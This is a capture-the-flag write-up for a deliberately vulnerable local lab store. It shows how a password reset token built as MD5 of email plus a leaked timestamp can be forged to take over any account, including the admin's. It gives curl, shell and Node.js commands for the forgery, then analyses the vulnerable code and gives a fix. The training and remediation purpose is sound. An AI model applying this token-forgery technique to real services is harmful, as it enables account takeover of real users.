---
author: kOaDT
authorGithubUrl: https://github.com/kOaDT
authorGithubAvatar: https://avatars.githubusercontent.com/u/17499022?v=4
pubDatetime: 2026-02-26T21:11:00Z
title: "Insecure Password Reset: Predictable Token Forgery"
slug: insecure-password-reset
draft: false
tags:
  - writeup
  - authentication
  - ctf
description: Exploit a predictable password reset token generation mechanism to take over any user account.
---

The password reset feature generates tokens using `MD5(email + timestamp)`, where the timestamp is leaked in the API response. This allows an attacker to forge valid reset tokens for any user account.

## Table of contents

## Lab setup

Start the lab using the following command:

```bash
npx create-oss-store@latest
```

Navigate to `http://localhost:3000` and familiarize yourself with the application.

## Target identification

### Step 1: Discover the password reset feature

Navigate to the login page at `/login`. Notice the "Forgot password?" link below the password field. Click it to reach `/login/forgot-password`.

### Step 2: Analyze the API response

Enter your own email (e.g., `alice@example.com`) and submit the form. Open your browser's DevTools Network tab to inspect the response from `POST /api/auth/forgot-password`:

```json
{
  "message": "If an account with that email exists, a password reset link has been sent.",
  "requestedAt": "2026-02-26T10:30:45.123Z"
}
```

The `requestedAt` field contains a precise ISO timestamp. This is suspicious. Why would a "check your email" response need to include the exact server time?

## Exploitation

### Step 3: Understand the token algorithm

By examining the application or through experimentation, determine that the reset token is generated as:

```
token = MD5(email + Math.floor(Date.now() / 1000))
```

The `requestedAt` timestamp reveals the exact second the token was created.

### Step 4: Request a reset for any user

You can target any account. For example, using Alice's account:

```bash
curl -s -X POST http://localhost:3000/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com"}'
```

Note the `requestedAt` value from the response.

### Step 5: Compute the forged token

Convert the ISO timestamp to a Unix timestamp and compute the MD5 hash:

```bash
# Example: requestedAt = "2026-02-26T10:30:45.123Z"
TIMESTAMP=$(date -d "2026-02-26T10:30:45.123Z" +%s)
TOKEN=$(echo -n "alice@example.com${TIMESTAMP}" | md5sum | cut -d' ' -f1)
echo $TOKEN
```

Or using Node.js:

```javascript
const crypto = require("crypto");
const requestedAt = "2026-02-26T10:30:45.123Z";
const timestamp = Math.floor(new Date(requestedAt).getTime() / 1000);
const token = crypto
  .createHash("md5")
  .update("alice@example.com" + timestamp)
  .digest("hex");
console.log(token);
```

### Step 6: Reset the password and get the flag

```bash
curl -s -X POST http://localhost:3000/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"${TOKEN}\",\"password\":\"hacked123\"}"
```

The response contains the flag:

```json
{
  "message": "Your password has been reset successfully.",
  "flag": "OSS{1ns3cur3_p4ssw0rd_r3s3t}"
}
```

### Bonus: Admin account takeover

For a more impactful demonstration, target the admin account:

1. Request a reset for `admin@oss.com` instead
2. Forge the token using the same technique
3. Reset the admin password
4. Log in at `/login` with the new credentials

## Vulnerable code analysis

The core vulnerability is in the token generation logic:

```typescript
// app/api/auth/forgot-password/route.ts
const now = new Date();
const requestedAt = now.toISOString();
const timestamp = Math.floor(now.getTime() / 1000);

const token = hashMD5(email + timestamp);

return NextResponse.json({
  message:
    "If an account with that email exists, a password reset link has been sent.",
  requestedAt, // This leaks the timestamp used in token generation
});
```

The two inputs to the token — email and timestamp — are both known to the attacker:

- The email is provided by the attacker in the request
- The timestamp is leaked via the `requestedAt` field in the response

## Remediation

Use a cryptographically secure random token generator instead of a deterministic algorithm:

```typescript
import crypto from "crypto";

const token = crypto.randomBytes(32).toString("hex");
```

Remove the `requestedAt` field from the API response, and add rate limiting to prevent abuse.
